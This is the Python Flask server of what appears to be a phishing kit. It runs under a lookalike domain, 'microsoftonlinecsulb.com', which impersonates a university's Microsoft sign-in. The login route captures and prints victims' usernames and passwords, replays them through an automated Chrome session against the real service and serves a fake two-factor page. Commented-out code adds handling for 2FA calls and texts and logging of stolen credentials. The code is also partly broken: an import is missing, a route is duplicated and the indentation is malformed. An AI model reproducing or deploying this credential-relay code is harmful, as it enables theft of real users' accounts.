
from flask import Flask , redirect, url_for, render_template, request,Blueprint
from OpenSSL import SSL

import random, string, os
import time
import main

from _thread import start_new_thread



app = Flask(__name__)
context = ('/etc/letsencrypt/live/microsoftonlinecsulb.com/cert.pem', '/etc/letsencrypt/live/microsoftonlinecsulb.com/privkey.pem')

#this stuff is no longer supported
# context = SSL.Context(SSL.TLSv1_2_METHOD)
# context.use_privatekey_file('/etc/letsencrypt/live/microsoftonlinecsulb.com/privkey.pem')
# context.use_certificate_chain_file('/etc/letsencrypt/live/microsoftonlinecsulb.com/fullchain.pem')
# context.use_certificate_file('/etc/letsencrypt/live/microsoftonlinecsulb.com/cert.pem')


@app.route('/profile')
def profile():
    return 'Profile'

@app.route("/")
def change_it():
    return render_template("index.html")

@app.route('/login', methods=['GET', 'POST'])
def login():
    # Here we use a class of some kind to represent and validate our
    # client-side form data. For example, WTForms is a library that will
    # handle this for us, and we use a custom LoginForm to validate.
    email = request.form.get('username')
    password = request.form.get('password')
    print(email,password)
    chrome = main.startChrome()
    var = chrome.login_email(email,password)
    if var == True:
        #stop loading
       print("its true")
        

    
    # if request.method == "POST":
    #     todo = request.form.get("todo")
    #     print(todo)
        return render_template('2fa.html')

@app.route("/")
def home():
    return render_template("index.html")

# mofified code from runmain.py to work w/ flask
# @app.route('/main', methods=['POST'])
# def main():
#     email = request.form.get('email')
#     password = request.form.get('password')

#     main.login_email(email, password)

#     while not os.path.exists(email+"call.txt"):
#         time.sleep(2)

#     with open(email+"call.txt") as file:
#         var_return = file.readline().strip()

#     if var_return == "1":
#         main.call()
#     else:
#         main.text(email)

#     main.open_mycsulb()
#     main.log_info(email, password)
#     main.driver.close()


#added routes to work w/ the app.js code

@app.route('/check_login', methods=['POST'])
def check_login():
    username = request.json.get('username')

    # Check if the user is logged in
    loggedIn = False
        # if the user isn't logged in? 

    return jsonify({'loggedIn': loggedIn})

@app.route('/check_file', methods=['POST'])
def check_file():
    filename = request.json.get('filename')

    # Check if the file exists
    exists = False
    # what do we need to do if the file doesn't exist?

    return jsonify({'exists': exists})


# @main.route('/mydata', methods = ['POST'])
# def view_data():
#      if request.method == 'POST':
#         user =  request.form["email"]
#         pswd = request.form["password"]
#         barChartData = ""
#         pieChartData = ""
#         #temp if statement that needs to be replaced with user validation
#         if 1 == 1:
#             #files containing the json formats needed for HighCharts
#             with open('./'+user+'/topTags.json', 'r') as file:
#                 pieChartData = json.loads(file.read())
#             #with open('./'+user+'/'+pswd, 'r') as file:
#             with open('./'+user+'/topten.json', 'r') as file:
#                 barChartData = json.loads(file.read())
#             return render_template("chart.html", topTenData=json.dumps(barChartData), pieData=json.dumps(pieChartData))
#         else:
#             return redirect(url_for(home))


# #creates a string of the filenames from upload_files and uses it as an argument for c++ program
# def processFiles(userhash):
#     fileList = []
#     for file in os.listdir('./'+userhash+'/'):
#         if file.endswith(".json"):
#             fileList.append('./'+userhash+'/' + file)
#     arg = ' '.join(fileList)
#     #start c++ project to process the initall data
#     os.system("./Spotify " + arg)
#     processData(userhash)

app.run(host='0.0.0.0', port=443, threaded=True, ssl_context=context, debug=True)